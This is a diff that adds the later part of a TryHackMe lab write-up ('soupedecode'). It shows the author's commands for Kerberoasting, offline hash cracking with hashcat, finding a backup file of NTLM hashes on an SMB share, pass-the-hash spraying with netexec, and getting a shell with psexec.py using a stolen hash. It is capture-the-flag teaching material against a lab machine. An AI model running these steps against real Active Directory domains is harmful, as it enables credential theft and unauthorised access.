@@ -181,3 +181,99 @@ Downloaded it on my own kali machine and got the user flag.
 
 ### Access as service account 'file\_svc'
 
+Next, I listed out all the service accounts present on the target machine and got 5 service accounts.
+
+```
+┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
+└─$ GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:'REDACTED' -dc-ip 10.201.28.223
+```
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+Requested ticket for all those account and got their Kerberos hashes.
+
+```
+┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
+└─$ GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:'REDACTED' -dc-ip 10.201.28.223 -request
+```
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+Saved all those hashes in a file and tried to crack all of them via hashcat.
+
+```
+┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
+└─$ hashcat -m 13100 all-kerb-hash /usr/share/wordlists/rockyou.txt
+```
+
+Through hashcat I was able to crack hash of only 'file\_svc' service account.
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Access as 'FileServer$' account and Root flag
+
+Enumerating shares with 'file\_svc' account revealed that it had read access over 'backup' share on the machine.
+
+```
+┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
+└─$ nxc smb 10.201.28.223 -u 'file_svc' -p 'REDACTED' --shares
+```
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+Connected to 'backup' share with smbclient and found a suspicious file named 'backup\_extract.txt' .
+
+```
+┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
+└─$ smbclient '//10.201.28.223/backup' -U 'file_svc'
+```
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+Downloaded that file on my own kali machine and opening it revealed some NTLM hashes of accounts present on the target machine.
+
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+Here, we can simply extract usernames from it in a different file, and hashes on another file.
+
+* For extracting usernames:
+
+```
+┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
+└─$ cut -d ':' -f 1 backup_extract.txt > userlist
+```
+
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+* For extracting hashes
+
+```
+┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
+└─$ cut -d ':' -f 4 backup_extract.txt > hashlist
+```
+
+<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+Performed pass the hash attack via netexec and found a valid username and hash combination.
+
+```
+┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
+└─$ nxc smb 10.201.8.25 -u userlist -H hashlist --no-brute
+```
+
+<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+Next, I used psexec to gain shell on the target machine with the obtained credentials.
+
+```
+┌──(ghost㉿kali)-[~/tryhackme/soupedecode]
+└─$ psexec.py 'FileServer$'@10.201.8.25 -hashes aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559
+```
+
+<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+As this account had enough privileges, I was able to access Administrator directory and there in the Desktop directory I got the root flag.
+
+<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
